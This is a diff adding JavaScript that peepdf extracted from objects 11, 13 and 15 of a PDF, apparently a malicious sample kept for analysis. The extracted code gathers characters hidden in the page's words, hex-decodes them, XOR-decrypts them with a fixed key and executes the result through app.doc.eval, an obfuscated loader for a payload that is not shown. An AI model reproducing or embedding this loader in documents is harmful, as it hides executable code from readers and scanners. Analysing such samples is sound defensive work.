@@ -1,0 +1,36 @@
+// peepdf comment: Javascript code located in object 11 (version 0)
+
+function A0wCGA(Gu___xS) {
+    var rHfEnW_Y = '';
+    for (eIL8v__ = 0; eIL8v__ < Gu___xS.length; eIL8v__ += 2) {
+        rHfEnW_Y += String.fromCharCode(parseInt('' + Gu___xS.charAt(eIL8v__) + Gu___xS.charAt(eIL8v__ + 1), 16).toString(10));
+    }
+    return rHfEnW_Y;
+}
+function eioO_p_(Gu___xS, ttS_rL_) {
+    var rHfEnW_Y = '';
+    var UI_pgE = 0;
+    for (eIL8v__ = 0; eIL8v__ < Gu___xS.length; eIL8v__++) {
+        rHfEnW_Y += String.fromCharCode(Gu___xS.charCodeAt(eIL8v__) ^ ttS_rL_.charCodeAt(UI_pgE++));
+        if (UI_pgE >= ttS_rL_.length) {
+            UI_pgE = 0;
+        }
+    }
+    return rHfEnW_Y;
+}
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+ var o = '';
+
+ var numWords = this.getPageNumWords(this.pageNum);
+
+ for (var i = 0; i < numWords; i++) {
+     word = this.getPageNthWord(0, i);
+     o += word.substr(word.length - 2, 2);
+ }
+
+// peepdf comment: Javascript code located in object 15 (version 0)
+
+app.doc.eval(eioO_p_(A0wCGA(o), 'oU1EM_x'));
+
